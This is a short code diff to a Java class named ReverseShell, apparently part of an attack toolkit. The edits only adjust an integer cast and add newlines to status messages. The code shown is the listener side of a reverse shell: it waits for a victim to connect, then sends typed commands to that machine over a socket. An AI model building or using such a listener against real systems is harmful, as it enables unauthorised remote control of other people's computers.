@@ -33,15 +33,15 @@ public class ReverseShell implements Attack {
         guiThead.start();
 
         try {
-            server = new ServerSocket(port.getValue().intValue());
-            System.out.println("Server started on port " + port.getValue().intValue());
+            server = new ServerSocket((int)port.getValue());
+            System.out.println("Server started on port " + port.getValue() + "\n");
             client = server.accept();
-            System.out.println("Client connected from " + client.getInetAddress().getHostAddress());
+            System.out.println("Client connected from " + client.getInetAddress().getHostAddress() + "\n");
             input = client.getInputStream();
             output = client.getOutputStream();
             Scanner scanner = new Scanner(System.in);
             while (true) {
-                System.out.print("Enter command: ");
+                System.out.print("Enter command: \n");
                 String command = scanner.nextLine();
                 output.write(command.getBytes());
                 byte[] buffer = new byte[1024];
